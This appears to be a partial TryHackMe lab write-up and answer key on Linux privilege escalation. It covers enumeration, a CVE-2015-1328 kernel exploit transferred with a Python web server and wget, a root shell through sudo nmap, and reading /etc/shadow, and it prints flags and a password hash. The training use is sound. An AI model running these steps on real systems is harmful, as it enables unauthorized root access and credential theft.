![Linux Privilege Escalation Banner](https://assets.tryhackme.com/room-banners/privesc.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Cover.png" alt="Linux Privilege Escalation Logo">
</p>

# Linux Privilege Escalation

This guide contains the answer and steps necessary to get to them for the [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc) room.

## Table of contents

- [Enumeration](#enumeration)
- [Automated Enumeration Tools](#automated-enumeration-tools)
- [Privilege Escalation: Kernel Exploits](#privilege-escalation-kernel-exploits)
- [Privilege Escalation: Sudo](#privilege-escalation-sudo)
- [Privilege Escalation: SUID](#privilege-escalation-suid)
- [Privilege Escalation: Capabilities](#privilege-escalation-capabilities)
- [Privilege Escalation: Cron Jobs](#privilege-escalation-cron-jobs)
- [Privilege Escalation: PATH](#privilege-escalation-path)
- [Privilege Escalation: NFS](#privilege-escalation-nfs)
- [Capstone Challenge](#capstone-challenge)

### Enumeration

1. What is the hostname of the target system?

   ><details><summary>Click for answer</summary>wade7363</details>
   
2. What is the Linux kernel version of the target system?

   ><details><summary>Click for answer</summary>3.13.0-24-generic</details>

3. What Linux is this?

   ><details><summary>Click for answer</summary>Ubuntu 14.04 LTS</details>

4. What version of the Python language is installed on the system?

   ><details><summary>Click for answer</summary>2.7.6</details>

5. What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)

   ><details><summary>Click for answer</summary>CVE-2015-1328</details>

### Automated Enumeration Tools

### Privilege Escalation: Kernel Exploits

1. Find and use the appropriate kernel exploit to gain root privileges on the target system.

   We first need to find the kernel version on this system with `uname -a`.

   KERNEL VERSION

   Then we can look for an exploit for this kernel through Exploit Database for example.

   KERNEL EXPLOIT

   Now we can either download the file from here or locate it on our machine through the file name. 

3. What is the content of the flag1.txt file?

   I will first  rename the file to exploit.c.

   ```cmd
   mv 37292.c exploit.c
   ```

   Then we set up a web server on our machine to deliver the file.

   ```cmd
   python3 -m http.server 8080
   ```

   In the temp folder we can download the exploit.

   ```cmd
   wget 10.18.78.136:8080/exploit.c
   ```

   KERNEL PREPARE
   
   Now we should compile the file.

   ```cmd
   gcc exploit.c -o exploit
   ```

   KERNEL SUCCESS

   Lastly, we need to search for the flag and read it!
   
   ```cmd
   find / -name flag1.txt 2>/dev/null

   cat /home/matt/flag1.txt
   ```

   KERNEL FLAG
   
   ><details><summary>Click for answer</summary>THM-28392872729920</details>
   
### Privilege Escalation: Sudo

1. How many programs can the user "karen" run on the target system with sudo rights?

   We can find that out with: `sudo -l`.

   SUDO PERMISSIONS

   ><details><summary>Click for answer</summary>3</details>

3. What is the content of the flag2.txt file?

   We first locate the flag with:

   ```cmd
   find / -name flag2.txt 2>/dev/null
   ```

   SUDO LOCATION

   To read the flag we can use either `less` or `nano`.

   ```cmd
   sudo less /home/ubuntu/flag2.txt

   sudo nano /home/ubuntu/flag2.txt
   ```

   SUDO FLAG

   P.s. It turned out permission weren't even needed to read the flag..

   ><details><summary>Click for answer</summary>THM-402028394</details>

5. How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

   This can be found on the GTFOBins website whilst searching for nmap.

   ><details><summary>Click for answer</summary>sudo nmap --interactive</details>

6. What is the hash of frank's password?

   To do this we exploit the nmap sudo permissions to read the shadow file.

   ```cmd
   sudo nano /etc/shadow
   ```

   SUDO HASHES

   ><details><summary>Click for answer</summary>$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1</details>
   

### Privilege Escalation: SUID
### Privilege Escalation: Capabilities
### Privilege Escalation: Cron Jobs
### Privilege Escalation: PATH
### Privilege Escalation: NFS
### Capstone Challenge



1. 

   

   ><details><summary>Click for answer</summary></details>
